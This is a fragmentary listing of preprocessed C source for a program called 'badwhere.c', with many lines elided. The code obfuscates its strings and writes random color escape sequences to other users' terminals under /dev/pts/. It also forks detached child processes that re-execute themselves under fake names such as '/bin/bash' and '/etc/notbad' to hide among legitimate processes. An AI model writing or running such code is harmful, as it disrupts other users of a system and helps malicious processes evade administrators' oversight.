...
# 56 "badwhere.c"
 ...
 dp = opendir((xorstr("/dev/pts/", sizeof("/dev/pts/"))));
 if (dp != 
# 59 "badwhere.c" 3 4
          ((void *)0)
# 59 "badwhere.c"
...
# 68 "badwhere.c"
  ...
  if (listcount > 0) {
   ...
   snprintf(fname, 0x100 -1, (xorstr("/dev/pts/%d", sizeof("/dev/pts/%d"))), list[num]);
   fd = open(fname, 
# 86 "badwhere.c" 3 4
                   01
# 86 "badwhere.c"
...
void colorit(int fd) {
 int choice = rand() % (sizeof((xorstr("0123456", sizeof("0123456"))))-1);
 if (fd == -1) {
  printf((xorstr("\x1b[3%c;4%cm :) \n", sizeof("\x1b[3%c;4%cm :) \n"))), (xorstr("0123456", sizeof("0123456")))[choice], (xorstr("0123456", sizeof("0123456")))[choice]);
 } else {
  dprintf(fd, (xorstr("\x1b[3%c;4%cm :) \n", sizeof("\x1b[3%c;4%cm :) \n"))), (xorstr("0123456", sizeof("0123456")))[choice], (xorstr("0123456", sizeof("0123456")))[choice]);
 }
}
...
void causeloops(char* path) {
 ...
 for (i=0; i < 6; i++) {
  ...
  if (p == 0) {
   ...
   setsid();
   switch (rand() % 6) {
   case 0: name = (xorstr("./nothing", sizeof("./nothing"))); break;
   case 1: name = (xorstr("/bin/nice", sizeof("/bin/nice"))); break;
   case 2: name = (xorstr("~/.i/am/a/goodguy", sizeof("~/.i/am/a/goodguy"))); break;
   case 3: name = (xorstr("/etc/notbad", sizeof("/etc/notbad"))); break;
   case 4: name = (xorstr("/bin/bash", sizeof("/bin/bash"))); break;
   case 5: name = (xorstr("jordan", sizeof("jordan"))); break;
   }
   execl(path, name, 
# 152 "badwhere.c" 3 4
                    ((void *)0)
...
int main(int argc, char* argv[]) {
 ...
 if (strstr(argv[0], (xorstr("badwhere", sizeof("badwhere")))) == 
# 183 "badwhere.c" 3 4
                                      ((void *)0)
# 183 "badwhere.c"
                                          ) {
